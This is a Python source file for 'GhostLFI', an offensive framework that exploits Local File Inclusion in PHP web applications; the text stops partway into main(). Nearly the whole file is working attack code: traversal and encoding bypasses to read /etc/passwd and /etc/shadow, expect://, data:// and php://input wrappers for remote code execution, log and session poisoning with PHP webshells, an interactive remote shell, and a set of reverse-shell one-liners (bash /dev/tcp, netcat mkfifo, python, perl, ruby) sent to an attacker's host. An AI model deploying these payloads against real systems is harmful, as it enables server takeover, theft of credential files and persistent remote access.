#!/usr/bin/env python3
"""
GhostLFI - Local File Inclusion Exploitation Framework
Ghost Ops Security - The Ultimate All-In-One LFI Tool

Everything you need in ONE tool:
- Payload generation (LFI, wrappers, shells, revshells)
- Wrapper testing (expect://, data://, php://input)
- HTB Academy techniques (100% coverage)
- Bypass techniques (null byte, encoding, traversal)
- Log poisoning (Apache, Nginx)
- Session poisoning (PHP sessions)
- Interactive shell (with built-in generators)
- Reverse shell (automatic deployment with prompts)
- Auto-exploit (smart testing order)

For authorized penetration testing only.
"""

import argparse
import requests
import urllib.parse
import base64
import re
import sys
import time
import socket
import os
from typing import List, Dict, Tuple, Optional
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

init(autoreset=True)


class UltimateLFIExploiter:
    """The only LFI tool you'll ever need - everything integrated"""
    
    def __init__(self, target_url: str, parameter: str, proxy: Optional[str] = None):
        self.target_url = target_url
        self.parameter = parameter
        self.session = requests.Session()
        self.session.verify = False
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.rce_method = None
        self.config_status = {}
        self.successful_methods = []
        
        # LFI test paths
        self.lfi_paths = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/issue',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
        ]
        
        # Webshells
        self.webshells = {
            'minimal': '<?php system($_GET["cmd"]); ?>',
            'request': '<?php system($_REQUEST["cmd"]); ?>',
            'post': '<?php system($_POST["cmd"]); ?>',
            'eval': '<?php eval($_REQUEST["cmd"]); ?>',
            'passthru': '<?php passthru($_GET["cmd"]); ?>',
        }
    
    def print_banner(self):
        """Display tool banner"""
        banner = f"""
{Fore.CYAN}
   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗     ███████╗██╗
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║     ██╔════╝██║
  ██║  ███╗███████║██║   ██║███████╗   ██║   ██║     █████╗  ██║
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██║     ██╔══╝  ██║
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████╗██║     ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝
{Style.RESET_ALL}
{Fore.RED}        ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
       ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
       ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ 
       ▐░▌          ▐░▌       ▐░▌     ▐░▌     
       ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
       ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
        ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀      ▐░▌     
                 ▐░▌▐░▌               ▐░▌     
        ▄▄▄▄▄▄▄▄▄█░▌▐░▌           ▄▄▄▄█░█▄▄▄▄ 
       ▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌
        ▀▀▀▀▀▀▀▀▀▀▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀ {Style.RESET_ALL}

{Fore.WHITE}╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║          {Fore.YELLOW}Local File Inclusion Exploitation Framework{Fore.WHITE}             ║
║                    {Fore.CYAN}Ghost Ops Security{Fore.WHITE}                              ║
║                                                                    ║
║  {Fore.GREEN}✓{Fore.WHITE} Payload Generation    {Fore.GREEN}✓{Fore.WHITE} Wrapper Testing    {Fore.GREEN}✓{Fore.WHITE} RCE           ║
║  {Fore.GREEN}✓{Fore.WHITE} Bypass Techniques     {Fore.GREEN}✓{Fore.WHITE} Log Poisoning      {Fore.GREEN}✓{Fore.WHITE} Shells        ║
║  {Fore.GREEN}✓{Fore.WHITE} Session Poisoning     {Fore.GREEN}✓{Fore.WHITE} Auto-Exploit       {Fore.GREEN}✓{Fore.WHITE} HTB Academy   ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}[*] Target URL: {Fore.WHITE}{self.target_url}{Style.RESET_ALL}
{Fore.YELLOW}[*] Parameter:  {Fore.WHITE}{self.parameter}{Style.RESET_ALL}
{Fore.YELLOW}[*] Version:    {Fore.WHITE}2.0 - Ghost Edition{Style.RESET_ALL}
"""
        print(banner)

    # ==================== PAYLOAD GENERATION ====================
    
    def generate_lfi_payloads(self, target_file: str = '/etc/passwd', depth: int = 10) -> Dict[str, str]:
        """Generate various LFI bypass payloads"""
        payloads = {
            'basic': '../' * depth + target_file,
            'null_byte': '../' * depth + target_file + '%00',
            'null_byte_ext': '../' * depth + target_file + '%00.jpg',
            'double_encode': ('..' + '%252f') * depth + target_file,
            'path_truncation': '../' * depth + target_file + '/' * 2048,
            'dot_truncation': '../' * depth + target_file + '/.' * 2048,
            'url_encoded': ('..' + '%2f') * depth + target_file,
            'double_traversal': ('..../' + '/') * depth + target_file,
            'backslash': ('..\\') * depth + target_file.replace('/', '\\'),
            'mixed_encoding': ('%2e%2e%2f') * depth + target_file,
            'absolute': '/' + target_file,
        }
        return payloads
    
    def generate_wrapper_payloads(self, command: str = "id") -> Dict[str, any]:
        """Generate all PHP wrapper payloads"""
        payloads = {}
        
        # expect:// wrapper
        payloads['expect'] = f'expect://{urllib.parse.quote(command)}'
        
        # data:// wrapper - base64
        php_code = f'<?php system("{command}"); ?>'
        b64 = base64.b64encode(php_code.encode()).decode()
        payloads['data_base64'] = f'data://text/plain;base64,{b64}'
        
        # data:// wrapper - plain
        payloads['data_plain'] = f'data://text/plain,{urllib.parse.quote(php_code)}'
        
        # php://input (needs POST)
        payloads['php_input'] = {
            'url': 'php://input',
            'post_get': '<?php system($_GET["cmd"]); ?>',
            'post_request': '<?php system($_REQUEST["cmd"]); ?>',
            'post_direct': php_code
        }
        
        # php://filter
        payloads['filter_base64'] = 'php://filter/convert.base64-encode/resource='
        
        return payloads
    
    def generate_reverse_shells(self, lhost: str, lport: int = 4444) -> Dict[str, str]:
        """Generate various reverse shell payloads"""
        shells = {
            'bash_tcp': f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
            'bash_tcp_alt': f'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'python': f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            'python3': f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            'perl': f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
            'nc': f'nc -e /bin/sh {lhost} {lport}',
            'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            'php': f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            'ruby': f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        }
        return shells
    
    def encode_payload(self, payload: str) -> Dict[str, str]:
        """Encode payload in various formats"""
        encodings = {
            'original': payload,
            'url': urllib.parse.quote(payload),
            'double_url': urllib.parse.quote(urllib.parse.quote(payload)),
            'base64': base64.b64encode(payload.encode()).decode(),
            'hex': payload.encode().hex(),
        }
        return encodings

    # ==================== PHP CONFIG CHECK ====================
    
    def check_php_config(self) -> Dict[str, bool]:
        """Check PHP configuration - HTB Academy methodology"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 1] PHP Configuration Check")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        config_status = {
            'allow_url_include': False,
            'allow_url_fopen': False,
            'expect_extension': False,
            'config_readable': False
        }
        
        php_versions = ['8.2', '8.1', '8.0', '7.4', '7.3', '7.2', '7.1', '7.0', '5.6']
        config_paths = []
        
        for version in php_versions:
            config_paths.extend([
                f'/etc/php/{version}/apache2/php.ini',
                f'/etc/php/{version}/fpm/php.ini',
                f'/etc/php/{version}/cli/php.ini',
            ])
        
        config_paths.extend([
            '/usr/local/lib/php.ini',
            '/etc/php.ini',
            'C:\\xampp\\php\\php.ini',
            'C:\\php\\php.ini',
        ])
        
        print(f"{Fore.YELLOW}[*] Attempting to read PHP configuration...{Style.RESET_ALL}")
        
        for config_path in config_paths:
            try:
                payload = f'php://filter/convert.base64-encode/resource={config_path}'
                response = self._send_payload(payload, timeout=5)
                
                base64_pattern = re.findall(r'([A-Za-z0-9+/]{100,}={0,2})', response.text)
                
                if base64_pattern:
                    for b64_string in base64_pattern:
                        try:
                            decoded = base64.b64decode(b64_string).decode('utf-8', errors='ignore')
                            
                            if 'allow_url_include' in decoded:
                                config_status['config_readable'] = True
                                
                                if re.search(r'allow_url_include\s*=\s*On', decoded, re.IGNORECASE):
                                    config_status['allow_url_include'] = True
                                    print(f"{Fore.GREEN}[✓] allow_url_include = On (data://, php://input, RFI enabled){Style.RESET_ALL}")
                                else:
                                    print(f"{Fore.RED}[✗] allow_url_include = Off (data://, php://input, RFI disabled){Style.RESET_ALL}")
                                
                                if re.search(r'allow_url_fopen\s*=\s*On', decoded, re.IGNORECASE):
                                    config_status['allow_url_fopen'] = True
                                    print(f"{Fore.GREEN}[✓] allow_url_fopen = On{Style.RESET_ALL}")
                                
                                if re.search(r'extension\s*=\s*expect', decoded):
                                    config_status['expect_extension'] = True
                                    print(f"{Fore.GREEN}[✓] expect extension enabled (expect:// available){Style.RESET_ALL}")
                                else:
                                    print(f"{Fore.YELLOW}[!] expect extension not found (expect:// unavailable){Style.RESET_ALL}")
                                
                                print(f"{Fore.CYAN}[+] Found config: {config_path}{Style.RESET_ALL}")
                                self.config_status = config_status
                                return config_status
                        except:
                            continue
            except:
                continue
        
        print(f"{Fore.YELLOW}[!] Could not read PHP configuration{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Will attempt all methods anyway...{Style.RESET_ALL}")
        self.config_status = config_status
        return config_status

    # ==================== LFI TESTING ====================
    
    def test_basic_lfi(self) -> bool:
        """Test for basic LFI vulnerability"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 2] LFI Vulnerability Test")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        for path in self.lfi_paths[:3]:  # Test first 3
            try:
                response = self._send_payload(path)
                if 'root:' in response.text and ('bin:' in response.text or 'daemon:' in response.text):
                    print(f"{Fore.GREEN}[✓] LFI vulnerability confirmed!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Successfully read: {path}{Style.RESET_ALL}")
                    return True
            except:
                continue
        
        # Try with traversal
        for depth in [4, 8, 12]:
            try:
                path = '../' * depth + 'etc/passwd'
                response = self._send_payload(path)
                if 'root:' in response.text:
                    print(f"{Fore.GREEN}[✓] LFI vulnerability confirmed!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Successfully read: {path}{Style.RESET_ALL}")
                    return True
            except:
                continue
        
        print(f"{Fore.RED}[✗] Could not confirm LFI vulnerability{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Continuing with wrapper tests anyway...{Style.RESET_ALL}")
        return False
    
    def test_lfi_bypasses(self) -> Dict[str, bool]:
        """Test various LFI bypass techniques"""
        print(f"\n{Fore.CYAN}[ADVANCED] Testing LFI Bypass Techniques{Style.RESET_ALL}")
        results = {}
        
        bypasses = self.generate_lfi_payloads('/etc/passwd', 6)
        
        for name, payload in bypasses.items():
            try:
                response = self._send_payload(payload)
                if 'root:' in response.text and 'bin:' in response.text:
                    print(f"{Fore.GREEN}[✓] Bypass successful: {name}{Style.RESET_ALL}")
                    results[name] = True
                else:
                    results[name] = False
            except:
                results[name] = False
        
        return results

    # ==================== WRAPPER TESTING ====================
    
    def test_expect_wrapper(self) -> bool:
        """Test expect:// wrapper"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 3.1] Testing expect:// Wrapper")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.config_status.get('expect_extension'):
            print(f"{Fore.YELLOW}[!] expect extension not detected in config{Style.RESET_ALL}")
        
        try:
            payload = 'expect://id'
            response = self._send_payload(payload)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] expect:// wrapper RCE successful!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Output: {response.text[:100]}...{Style.RESET_ALL}")
                self.rce_method = 'expect'
                self.successful_methods.append('expect://')
                return True
            else:
                print(f"{Fore.RED}[✗] expect:// wrapper not available{Style.RESET_ALL}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[✗] expect:// test failed{Style.RESET_ALL}")
            return False
    
    def test_data_wrapper(self) -> bool:
        """Test data:// wrapper"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 3.2] Testing data:// Wrapper")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.config_status.get('allow_url_include'):
            print(f"{Fore.YELLOW}[!] allow_url_include not enabled (required for data://){Style.RESET_ALL}")
        
        # Method 1: Base64
        print(f"{Fore.YELLOW}[*] Testing data:// with base64 encoding...{Style.RESET_ALL}")
        try:
            php_code = '<?php system("id"); ?>'
            b64_encoded = base64.b64encode(php_code.encode()).decode()
            payload = f'data://text/plain;base64,{b64_encoded}'
            
            response = self._send_payload(payload)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] data:// wrapper (base64) RCE successful!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Output: {response.text[:100]}...{Style.RESET_ALL}")
                self.rce_method = 'data_base64'
                self.successful_methods.append('data://base64')
                return True
        except:
            pass
        
        # Method 2: Plain text
        print(f"{Fore.YELLOW}[*] Testing data:// with plain text...{Style.RESET_ALL}")
        try:
            php_code = urllib.parse.quote('<?php system("id"); ?>')
            payload = f'data://text/plain,{php_code}'
            
            response = self._send_payload(payload)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] data:// wrapper (plain) RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'data_plain'
                self.successful_methods.append('data://plain')
                return True
        except:
            pass
        
        print(f"{Fore.RED}[✗] data:// wrapper not working{Style.RESET_ALL}")
        return False
    
    def test_php_input_wrapper(self) -> bool:
        """Test php://input wrapper"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 3.3] Testing php://input Wrapper")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.config_status.get('allow_url_include'):
            print(f"{Fore.YELLOW}[!] allow_url_include not enabled (required for php://input){Style.RESET_ALL}")
        
        payload = 'php://input'
        
        # Method 1: $_GET
        print(f"{Fore.YELLOW}[*] Testing php://input with \\$_GET...{Style.RESET_ALL}")
        try:
            php_code = '<?php system($_GET["cmd"]); ?>'
            response = self._send_payload(payload + '&cmd=id', method='POST', data=php_code)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] php://input with \\$_GET RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'php_input_get'
                self.successful_methods.append('php://input($_GET)')
                return True
        except:
            pass
        
        # Method 2: $_REQUEST
        print(f"{Fore.YELLOW}[*] Testing php://input with \\$_REQUEST...{Style.RESET_ALL}")
        try:
            php_code = '<?php system($_REQUEST["cmd"]); ?>'
            response = self._send_payload(payload + '&cmd=id', method='POST', data=php_code)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] php://input with \\$_REQUEST RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'php_input_request'
                self.successful_methods.append('php://input($_REQUEST)')
                return True
        except:
            pass
        
        # Method 3: Direct
        print(f"{Fore.YELLOW}[*] Testing php://input with direct execution...{Style.RESET_ALL}")
        try:
            php_code = '<?php system("id"); ?>'
            response = self._send_payload(payload, method='POST', data=php_code)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] php://input direct execution RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'php_input_direct'
                self.successful_methods.append('php://input(direct)')
                return True
        except:
            pass
        
        print(f"{Fore.RED}[✗] php://input wrapper not working{Style.RESET_ALL}")
        return False

    # ==================== LOG POISONING ====================
    
    def test_log_poisoning(self) -> bool:
        """Test log poisoning attack"""
        print(f"\n{Fore.CYAN}[ADVANCED] Testing Log Poisoning{Style.RESET_ALL}")
        
        log_paths = [
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/log/apache/access.log',
            '/var/log/httpd/access_log',
        ]
        
        # Inject payload
        print(f"{Fore.YELLOW}[*] Injecting payload into User-Agent...{Style.RESET_ALL}")
        payload_code = '<?php system($_GET["cmd"]); ?>'
        try:
            headers = {'User-Agent': payload_code}
            self.session.get(self.target_url, headers=headers, timeout=5, proxies=self.proxy)
        except:
            pass
        
        time.sleep(1)
        
        # Try to include logs
        for log_path in log_paths:
            try:
                print(f"{Fore.YELLOW}[*] Testing log: {log_path}{Style.RESET_ALL}")
                response = self._send_payload(log_path + '&cmd=id')
                
                if 'uid=' in response.text and 'gid=' in response.text:
                    print(f"{Fore.GREEN}[✓] Log poisoning successful: {log_path}{Style.RESET_ALL}")
                    self.rce_method = 'log_poisoning'
                    self.successful_methods.append('log_poisoning')
                    return True
            except:
                continue
        
        print(f"{Fore.RED}[✗] Log poisoning failed{Style.RESET_ALL}")
        return False

    # ==================== SESSION POISONING ====================
    
    def test_session_poisoning(self) -> bool:
        """Test session file poisoning"""
        print(f"\n{Fore.CYAN}[ADVANCED] Testing Session Poisoning{Style.RESET_ALL}")
        
        try:
            # Get session
            response = self.session.get(self.target_url, proxies=self.proxy)
            cookies = self.session.cookies.get_dict()
            
            if 'PHPSESSID' in cookies:
                session_id = cookies['PHPSESSID']
                print(f"{Fore.YELLOW}[*] Session ID: {session_id}{Style.RESET_ALL}")
                
                # Poison session
                poison_data = {self.parameter: '<?php system($_GET["cmd"]); ?>'}
                self.session.get(self.target_url, params=poison_data, proxies=self.proxy)
                
                # Include session file
                session_paths = [
                    f'/var/lib/php/sessions/sess_{session_id}',
                    f'/var/lib/php5/sessions/sess_{session_id}',
                    f'/tmp/sess_{session_id}',
                ]
                
                for session_path in session_paths:
                    response = self._send_payload(session_path + '&cmd=id')
                    
                    if 'uid=' in response.text and 'gid=' in response.text:
                        print(f"{Fore.GREEN}[✓] Session poisoning successful!{Style.RESET_ALL}")
                        self.rce_method = 'session_poisoning'
                        self.successful_methods.append('session_poisoning')
                        return True
            
            print(f"{Fore.RED}[✗] Session poisoning failed{Style.RESET_ALL}")
            return False
        except:
            print(f"{Fore.RED}[✗] Session poisoning failed{Style.RESET_ALL}")
            return False

    # ==================== COMMAND EXECUTION ====================
    
    def execute_command(self, command: str) -> str:
        """Execute command using discovered RCE method"""
        try:
            if self.rce_method == 'expect':
                payload = f'expect://{urllib.parse.quote(command)}'
                response = self._send_payload(payload)
                return response.text
            
            elif self.rce_method == 'data_base64':
                php_code = f'<?php system("{command}"); ?>'
                b64_encoded = base64.b64encode(php_code.encode()).decode()
                payload = f'data://text/plain;base64,{b64_encoded}'
                response = self._send_payload(payload)
                return response.text
            
            elif self.rce_method == 'data_plain':
                php_code = urllib.parse.quote(f'<?php system("{command}"); ?>')
                payload = f'data://text/plain,{php_code}'
                response = self._send_payload(payload)
                return response.text
            
            elif self.rce_method == 'php_input_get':
                payload = 'php://input'
                php_code = '<?php system($_GET["cmd"]); ?>'
                response = self._send_payload(payload + f'&cmd={urllib.parse.quote(command)}', method='POST', data=php_code)
                return response.text
            
            elif self.rce_method == 'php_input_request':
                payload = 'php://input'
                php_code = '<?php system($_REQUEST["cmd"]); ?>'
                response = self._send_payload(payload + f'&cmd={urllib.parse.quote(command)}', method='POST', data=php_code)
                return response.text
            
            elif self.rce_method == 'php_input_direct':
                payload = 'php://input'
                php_code = f'<?php system("{command}"); ?>'
                response = self._send_payload(payload, method='POST', data=php_code)
                return response.text
            
            elif self.rce_method == 'log_poisoning':
                # Assume log is already poisoned with cmd parameter
                log_paths = ['/var/log/apache2/access.log', '/var/log/nginx/access.log']
                for log_path in log_paths:
                    try:
                        response = self._send_payload(log_path + f'&cmd={urllib.parse.quote(command)}')
                        if len(response.text) > 10:
                            return response.text
                    except:
                        continue
                return "Command execution failed"
            
            else:
                return f"{Fore.RED}[!] No RCE method available{Style.RESET_ALL}"
        
        except Exception as e:
            return f"{Fore.RED}[!] Command execution failed: {str(e)}{Style.RESET_ALL}"

    # ==================== REVERSE SHELL ====================
    
    def deploy_reverse_shell(self, lhost: str, lport: int) -> bool:
        """Deploy reverse shell"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 4] Reverse Shell Deployment")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[*] Target: {lhost}:{lport}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {self.rce_method}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Make sure listener is running: nc -lvnp {lport}{Style.RESET_ALL}\n")
        
        shells = self.generate_reverse_shells(lhost, lport)
        
        for name, payload in shells.items():
            print(f"{Fore.YELLOW}[*] Trying {name}...{Style.RESET_ALL}")
            try:
                result = self.execute_command(payload)
                time.sleep(2)
                print(f"{Fore.GREEN}[+] Payload sent!{Style.RESET_ALL}")
            except:
                continue
        
        print(f"\n{Fore.GREEN}[+] All payloads sent! Check your listener.{Style.RESET_ALL}")
        return True

    # ==================== INTERACTIVE SHELL ====================
    
    def interactive_shell(self):
        """Interactive shell"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 5] Interactive Shell")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Interactive shell started!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] RCE Method: {self.rce_method}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Commands: 'exit' to quit, 'revshell' for reverse shell{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Commands: 'generate <type>' for payloads{Style.RESET_ALL}\n")
        
        while True:
            try:
                command = input(f"{Fore.GREEN}ghostops@target:~$ {Style.RESET_ALL}")
                
                if command.lower() in ['exit', 'quit']:
                    print(f"{Fore.YELLOW}[*] Exiting shell...{Style.RESET_ALL}")
                    break
                
                if command.lower() == 'revshell':
                    lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
                    lport = int(input(f"{Fore.YELLOW}Enter your port [4444]: {Style.RESET_ALL}") or "4444")
                    self.deploy_reverse_shell(lhost, lport)
                    continue
                
                if command.lower().startswith('generate'):
                    self._handle_generate_command(command)
                    continue
                
                if not command.strip():
                    continue
                
                output = self.execute_command(command)
                clean_output = self._extract_command_output(output)
                print(clean_output)
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Exiting shell...{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    def _handle_generate_command(self, command: str):
        """Handle payload generation commands in shell"""
        parts = command.split()
        if len(parts) < 2:
            print(f"{Fore.YELLOW}Usage: generate <shells|lfi|wrappers|bypass|revshell>{Style.RESET_ALL}")
            return
        
        gen_type = parts[1].lower()
        
        if gen_type == 'shells':
            print(f"\n{Fore.CYAN}[WEBSHELLS]{Style.RESET_ALL}")
            for name, shell in self.webshells.items():
                print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} {shell}")
        
        elif gen_type == 'lfi':
            print(f"\n{Fore.CYAN}[LFI PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_lfi_payloads()
            for name, payload in list(payloads.items())[:5]:
                print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} {payload[:80]}...")
        
        elif gen_type == 'wrappers':
            print(f"\n{Fore.CYAN}[WRAPPER PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_wrapper_payloads()
            for name, payload in payloads.items():
                if isinstance(payload, dict):
                    print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} (multiple variants)")
                else:
                    print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} {payload[:80]}...")
        
        elif gen_type == 'revshell':
            lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
            lport = int(input(f"{Fore.YELLOW}Enter port [4444]: {Style.RESET_ALL}") or "4444")
            print(f"\n{Fore.CYAN}[REVERSE SHELLS]{Style.RESET_ALL}")
            shells = self.generate_reverse_shells(lhost, lport)
            for name, shell in list(shells.items())[:3]:
                print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL}")
                print(f"  {shell}")
        
        else:
            print(f"{Fore.RED}Unknown type. Use: shells, lfi, wrappers, revshell{Style.RESET_ALL}")

    # ==================== AUTO-EXPLOIT ====================
    
    def auto_exploit(self, include_advanced: bool = False) -> bool:
        """Automatic exploitation workflow"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[AUTO-EXPLOIT] Starting Automated Exploitation")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        # Phase 1: Config
        self.check_php_config()
        
        # Phase 2: LFI Test
        self.test_basic_lfi()
        
        # Phase 3: Wrappers (HTB order)
        if self.test_expect_wrapper():
            return True
        
        if self.test_data_wrapper():
            return True
        
        if self.test_php_input_wrapper():
            return True
        
        # Phase 4: Advanced (if enabled)
        if include_advanced:
            print(f"\n{Fore.CYAN}[ADVANCED] Trying Advanced Techniques{Style.RESET_ALL}")
            
            if self.test_log_poisoning():
                return True
            
            if self.test_session_poisoning():
                return True
        
        print(f"\n{Fore.RED}{'='*60}")
        print(f"[FAIL] No RCE method successful")
        print(f"{'='*60}{Style.RESET_ALL}")
        return False

    # ==================== UTILITIES ====================
    
    def _send_payload(self, payload: str, method: str = 'GET', data: str = None, timeout: int = 10) -> requests.Response:
        """Send payload to target"""
        params = {self.parameter: payload}
        
        if method == 'GET':
            return self.session.get(self.target_url, params=params, proxies=self.proxy, timeout=timeout)
        elif method == 'POST':
            return self.session.post(self.target_url, params=params, data=data, proxies=self.proxy, timeout=timeout)
    
    def _extract_command_output(self, response: str) -> str:
        """Extract clean command output"""
        clean = re.sub(r'<[^>]+>', '', response)
        clean = re.sub(r'\n\s*\n', '\n', clean)
        return clean.strip()
    
    def print_summary(self):
        """Print exploitation summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[SUMMARY] Exploitation Results")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if self.successful_methods:
            print(f"{Fore.GREEN}[✓] Successful RCE Methods:{Style.RESET_ALL}")
            for method in self.successful_methods:
                print(f"    - {method}")
        else:
            print(f"{Fore.RED}[✗] No successful RCE methods found{Style.RESET_ALL}")
        
        if self.rce_method:
            print(f"\n{Fore.GREEN}[+] Active RCE Method: {self.rce_method}{Style.RESET_ALL}")
        
        if self.config_status:
            print(f"\n{Fore.YELLOW}[*] PHP Configuration:{Style.RESET_ALL}")
            for key, value in self.config_status.items():
                status = f"{Fore.GREEN}✓{Style.RESET_ALL}" if value else f"{Fore.RED}✗{Style.RESET_ALL}"
                print(f"    {status} {key}")
    
    # ==================== PAYLOAD DISPLAY ====================
    
    def show_payloads(self, payload_type: str):
        """Display generated payloads"""
        if payload_type == 'lfi':
            print(f"\n{Fore.CYAN}[LFI BYPASS PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_lfi_payloads()
            for name, payload in payloads.items():
                print(f"{Fore.YELLOW}{name:20}{Style.RESET_ALL} {payload[:80]}...")
        
        elif payload_type == 'wrappers':
            print(f"\n{Fore.CYAN}[WRAPPER PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_wrapper_payloads("whoami")
            for name, payload in payloads.items():
                print(f"{Fore.YELLOW}{name:20}{Style.RESET_ALL}")
                if isinstance(payload, dict):
                    for k, v in payload.items():
                        print(f"  {k}: {v[:60]}...")
                else:
                    print(f"  {payload}")
        
        elif payload_type == 'shells':
            print(f"\n{Fore.CYAN}[WEBSHELLS]{Style.RESET_ALL}")
            for name, shell in self.webshells.items():
                print(f"{Fore.YELLOW}{name:15}{Style.RESET_ALL} {shell}")
        
        elif payload_type == 'revshell':
            lhost = input(f"{Fore.YELLOW}Enter LHOST: {Style.RESET_ALL}")
            lport = int(input(f"{Fore.YELLOW}Enter LPORT [4444]: {Style.RESET_ALL}") or "4444")
            print(f"\n{Fore.CYAN}[REVERSE SHELLS FOR {lhost}:{lport}]{Style.RESET_ALL}")
            shells = self.generate_reverse_shells(lhost, lport)
            for name, shell in shells.items():
                print(f"\n{Fore.YELLOW}{name}:{Style.RESET_ALL}")
                print(f"  {shell}")


def main():
    parser = argparse.ArgumentParser(
